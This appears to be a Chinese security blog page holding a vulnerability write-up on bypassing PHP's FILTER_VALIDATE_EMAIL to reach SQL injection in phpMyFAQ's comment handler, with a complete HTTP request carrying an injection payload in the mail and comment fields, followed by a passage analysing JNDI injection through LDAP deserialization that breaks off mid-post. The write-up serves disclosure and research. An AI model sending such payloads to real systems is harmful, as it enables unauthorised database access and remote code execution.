<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_zval_filter</span><span class="params">(zval *value, zend_long filter, zend_long flags, zval *options, <span class="keyword">char</span>* charset, zend_bool copy)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	filter_list_entry  filter_func;</span><br><span class="line"></span><br><span class="line">	filter_func = php_find_filter(filter);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!filter_func.id) &#123;</span><br><span class="line">		<span class="comment">/* Find default filter */</span></span><br><span class="line">		filter_func = php_find_filter(FILTER_DEFAULT);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy) &#123;</span><br><span class="line">		SEPARATE_ZVAL(value);</span><br><span class="line">	&#125;</span><br><span class="line">   ......</span><br><span class="line">	convert_to_string(value);</span><br><span class="line"></span><br><span class="line">	filter_func.function(value, flags, options, charset);</span><br></pre></td></tr></table></figure>

<p>根据id, 查找到filter_func, 然后调用指定的方法。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/email1.jpg" alt="-w495"></p>
<p>filter_var第二个参数为FILTER_VALIDATE_EMAIL时, 调用的是  php_filter_validate_email方法。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/php-src/php/blob/PHP-5.4.5/ext/filter/logical_filters.c">https://github.com/php-src/php/blob/PHP-5.4.5/ext/filter/logical_filters.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">php_filter_validate_email</span><span class="params">(PHP_INPUT_FILTER_PARAM_DECL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> regexp[] = <span class="string">&quot;/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?))&#123;255,&#125;)(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?))&#123;65,&#125;@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]&#123;64,&#125;)(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.)&#123;1,126&#125;)&#123;1,&#125;(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)|(?:(?!(?:.*[a-f0-9][:\\]])&#123;7,&#125;)(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,5&#125;)?::(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,5&#125;)?)))|(?:(?:IPv6:(?:(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:)|(?:(?!(?:.*[a-f0-9]:)&#123;5,&#125;)(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,3&#125;)?::(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,3&#125;:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]&#123;2&#125;)|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]&#123;2&#125;)|(?:[1-9]?[0-9])))&#123;3&#125;))\\]))$/iD&quot;</span>;</span><br><span class="line"></span><br><span class="line">	pcre       *re = <span class="literal">NULL</span>;</span><br><span class="line">	pcre_extra *pcre_extra = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> preg_options = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span>         ovector[<span class="number">150</span>]; <span class="comment">/* Needs to be a multiple of 3 */</span></span><br><span class="line">	<span class="keyword">int</span>         matches;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The maximum length of an e-mail address is 320 octets, per RFC 2821. */</span></span><br><span class="line">	<span class="keyword">if</span> (Z_STRLEN_P(value) &gt; <span class="number">320</span>) &#123;</span><br><span class="line">		RETURN_VALIDATION_FAILED</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	re = pcre_get_compiled_regex((<span class="keyword">char</span> *)regexp, &amp;pcre_extra, &amp;preg_options TSRMLS_CC);</span><br><span class="line">	<span class="keyword">if</span> (!re) &#123;</span><br><span class="line">		RETURN_VALIDATION_FAILED</span><br><span class="line">	&#125;</span><br><span class="line">	matches = pcre_exec(re, <span class="literal">NULL</span>, Z_STRVAL_P(value), Z_STRLEN_P(value), <span class="number">0</span>, <span class="number">0</span>, ovector, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 0 means that the vector is too small to hold all the captured substring offsets */</span></span><br><span class="line">	<span class="keyword">if</span> (matches &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		RETURN_VALIDATION_FAILED</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去年提交这个漏洞的时候, 一直不知道怎么才能插入括号,  那时候用的双参数拼接的方法注入。<br>不过看这正则可以发现,<br>如果email的local part不以双引号开头和结尾, 允许的字符为<br>\x21\x23-\x27\x2A\x2B\x2D\x2F-\x39\x3D\x3F\x5E-\x7E<br>如果以双引号开头和结尾, 允许的字符为<br>\x01-\x08\x0B\x0C\x0E-\x1F\x21\x23-\x5B\x5D-\x7F<br>且如果前面的字符为\x5c, 后面紧跟的字符允许范围为 \x00-\x7F。</p>
<p>在local part以双引号开头和结尾这种情况中, 括号\x28 \x29在允许的字符范围内, 所以可以把括号写到双引号中。<br>虽然php_filter_validate_email允许邮箱最长为320个字符, 但是local part被正则限制到最多64个字符。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>(直接复制当初的邮件了~~~)</p>
<p>In the latest version of phpMyFAQ, there is a SQL Injection vulnerability in ajaxservice.php.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;savecomment&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$faqConfig-&gt;get(<span class="string">&#x27;records.allowCommentsForGuests&#x27;</span>) &amp;&amp; !$user-&gt;perm-&gt;checkRight($user-&gt;getUserId(), <span class="string">&#x27;addcomment&#x27;</span>)) &#123; </span><br><span class="line">    $message = <span class="keyword">array</span>(<span class="string">&#x27;error&#x27;</span> =&gt; $PMF_LANG[<span class="string">&#x27;err_NotAuth&#x27;</span>]);</span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$faq = <span class="keyword">new</span> PMF_Faq($faqConfig); </span><br><span class="line">$oComment = <span class="keyword">new</span> PMF_Comment($faqConfig); </span><br><span class="line">$category = <span class="keyword">new</span> PMF_Category($faqConfig); </span><br><span class="line">$type = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;type&#x27;</span>, FILTER_SANITIZE_STRING); </span><br><span class="line">$faqid = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;id&#x27;</span>, FILTER_VALIDATE_INT, <span class="number">0</span>); </span><br><span class="line">$newsid = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;newsid&#x27;</span>, FILTER_VALIDATE_INT); </span><br><span class="line">$username = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;user&#x27;</span>, FILTER_SANITIZE_STRING); </span><br><span class="line">$mail = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;mail&#x27;</span>, FILTER_VALIDATE_EMAIL); </span><br><span class="line">$comment = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;comment_text&#x27;</span>, FILTER_SANITIZE_SPECIAL_CHARS);</span><br></pre></td></tr></table></figure>

<p>The email variable uses FILTER_VALIDATE_EMAIL to validate, but FILTER_VALIDATE_EMAIL ﬁlter cannot completely prevent SQL Injection. With this ﬁlter, single quotes and some special characters can still be used, that’s enough for SQL Injection.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$commentData = [ </span><br><span class="line">    <span class="string">&#x27;record_id&#x27;</span> =&gt; $id, </span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; $type, </span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; $username, </span><br><span class="line">    <span class="string">&#x27;usermail&#x27;</span> =&gt; $mail, </span><br><span class="line">    <span class="string">&#x27;comment&#x27;</span> =&gt; nl2br($comment), </span><br><span class="line">    <span class="string">&#x27;date&#x27;</span> =&gt; $_SERVER[<span class="string">&#x27;REQUEST_TIME&#x27;</span>], </span><br><span class="line">    <span class="string">&#x27;helped&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure>

<p>The mail variable is loaded into the commentData variable,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$oComment-&gt;addComment($commentData)</span><br></pre></td></tr></table></figure>

<p>and the commentData variable is inserted into the database directly, thus leads to SQL Injection vulnerability.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addComment</span>(<span class="params"><span class="keyword">Array</span> $commentData</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $query = sprintf(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    INSERT INTO </span></span><br><span class="line"><span class="string">        %sfaqcomments </span></span><br><span class="line"><span class="string">    VALUES </span></span><br><span class="line"><span class="string">        (%d, %d, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;, %d,&#x27;%s&#x27;)&quot;</span>,</span><br><span class="line">    PMF_Db::getTablePrefix(), <span class="keyword">$this</span>-&gt;config-&gt;getDb()-&gt;nextId(PMF_Db::getTablePrefix().<span class="string">&#x27;faqcom ments&#x27;</span>,<span class="string">&#x27;id_comment&#x27;</span>), </span><br><span class="line">    $commentData[<span class="string">&#x27;record_id&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;type&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;usermail&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;comment&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;date&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;helped&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;config-&gt;getDb()-&gt;query($query)) &#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test the phpMyFAQ demo.</p>
<p>Firstly, add a question and got the question id.<br><a target="_blank" rel="noopener" href="http://denholm.demo.phpmyfaq.de/index.php?sid=620&amp;lang=zh&amp;action=add&amp;cat=2">http://denholm.demo.phpmyfaq.de/index.php?sid=620&amp;lang=zh&amp;action=add&amp;cat=2</a></p>
<p>Secondly ,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ajaxservice.php?action&#x3D;savecomment HTTP&#x2F;1.1 </span><br><span class="line">Host: denholm.demo.phpmyfaq.de </span><br><span class="line">Proxy-Connection: keep-alive </span><br><span class="line">Content-Length: 135 </span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01 Origin: http:&#x2F;&#x2F;denholm.demo.phpmyfaq.de </span><br><span class="line">X-Requested-With: XMLHttpRequest </span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit &#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;59.0.3071.115 Safari&#x2F;537.36 </span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8 </span><br><span class="line">Referer: http:&#x2F;&#x2F;denholm.demo.phpmyfaq.de&#x2F;index.php?action&#x3D;artikel&amp;cat&#x3D;1&amp;id&#x3D;2&amp;artlang&#x3D;zh </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6,it;q&#x3D;0.4</span><br><span class="line"></span><br><span class="line">id&#x3D;5&amp;lang&#x3D;zh&amp;type&#x3D;faq&amp;user&#x3D;xiaoyu111&amp;mail&#x3D;xiaoyu1~&#39;&#x2F;*11~%40qq.com&amp;comment_text&#x3D;*&#x2F;,(select user()),1500351093,null)#&amp;captcha&#x3D;OMSNS9</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/email2.jpg" alt="-w878"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>1.<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc3696#section-3">https://tools.ietf.org/html/rfc3696#section-3</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/"><span>JNDI-Injection-Via-LDAP-Deserialize</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-03T17:03:59.000Z">
          2018-12-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间FastJson的利用,最后使用了JNDI注入的方式 使得利用条件变得简单。<br>从一开始的RMI到LDAP, 都是把一个Reference对象绑定到N/D服务上, 最终实例化CodeBase远程代码库的类实现RCE。<br>但是这种方法在高版本jdk中已经不再能够使用, 由于TrustURLCodeBase的限制, 不再能够加载远程的代码库。<br>最近看几年前的BlackHat JNDI PPT时, 发现提到了除了Reference的另外几种方法。 不过没搜到EXP, 就自己看了下。</p>
<blockquote>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jndi1.jpg" alt="-w1099"></p>
</blockquote>
<h2 id="Reference的利用"><a href="#Reference的利用" class="headerlink" title="Reference的利用"></a>Reference的利用</h2><p>N/D为LDAP </p>
<p>N/D服务返回Reference对象后, 服务端这边decodeReference后<br>尝试加载类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  尝试在本地加载类。</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果从本地加载类失败,  从远程代码库中获取。</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>jdk1.7.0_80的 loadClass(String className, String codebase)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String className, String codebase)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ClassLoader parent = getContextClassLoader();</span><br><span class="line">    ClassLoader cl =</span><br><span class="line">             URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>直接使用URLClassLoader从远程动态加载字节码, 然后返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<p>然后实例化从远程获取到的类, 触发类的构造方法, 实现RCE。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jndi2.jpg" alt="-w1439"></p>
<hr>
<p>jdk 1.8.0_191 的loadClass(String className, String codebase)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">        ClassLoader parent = getContextClassLoader();</span><br><span class="line">        ClassLoader cl =</span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>如果trustURLCodebase为false的话, 直接返回null, 不再从远程代码库中动态加载字节码。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jndi3.jpg" alt="-w938"></p>
<p>并且trustURLCodebase已经默认为false, 所以不能够再使用这种方法。</p>
<h2 id="LDAP-反序列"><a href="#LDAP-反序列" class="headerlink" title="LDAP 反序列"></a>LDAP 反序列</h2><p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jndi4.jpg" alt="-w395"><br>在decodeObject N/D返回的对象时,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 感觉idea decompile出来的变量有点错, var1 var2有点混了。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> Object <span class="title">decodeObject</span><span class="params">(Attributes var0)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    </span><br><span class="line">    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="number">4</span>])); <span class="comment">// 获取ldap设置的codebase属性值, 这里为null</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Attribute var1;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果var0中有JAVA_ATTRIBUTES[1], 则会进行deserializeObject,  并且获取javaSerializedData属性值赋给1</span></span><br><span class="line">        <span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">1</span>])) != <span class="keyword">null</span>) &#123;    </span><br><span class="line">            ClassLoader var3 = helper.getURLClassLoader(var2); <span class="comment">// 这个var2应该是var1。</span></span><br><span class="line">            <span class="keyword">return</span> deserializeObject((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])var1.get()), var3);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">7</span>])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="number">2</span>]).get(), (String)var1.get(), var2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> var1 == <span class="keyword">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="number">2</span>]) ? <span class="keyword">null</span> : decodeReference(var0, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var5);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ClassLoader <span class="title">getURLClassLoader</span><span class="params">(String[] var1)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">    ClassLoader var2 = <span class="keyword">this</span>.getContextClassLoader();</span><br><span class="line">    <span class="keyword">return</span> (ClassLoader)(var1 != <span class="keyword">null</span> &amp;&amp; <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase) ? URLClassLoader.newInstance(getUrlArray(var1), var2) : var2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>如果trustURLCodebase为false的话， 不从远程代码库动态加载字节码, 而是直接返回从javaSerializedData属性中获取的属性值。 所以使用反序列不受trustURLCodebase的影响。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">deserializeObject</span><span class="params">(<span class="keyword">byte</span>[] var0, ClassLoader var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ByteArrayInputStream var2 = <span class="keyword">new</span> ByteArrayInputStream(var0);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object var20 = var1 == <span class="keyword">null</span> ? <span class="keyword">new</span> ObjectInputStream(var2) : <span class="keyword">new</span> Obj.LoaderInputStream(var2, var1);</span><br><span class="line">            Throwable var21 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            Object var5;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var5 = ((ObjectInputStream)var20).readObject(); <span class="comment">// 反序列操作</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>


<p>所以在启动ldap service的时候 只要设置了这个属性, 就可以进行反序列操作。</p>
<p>LDAPServer.java    是从marshalling.jar里扣出来的,稍微改了下代码。</p>
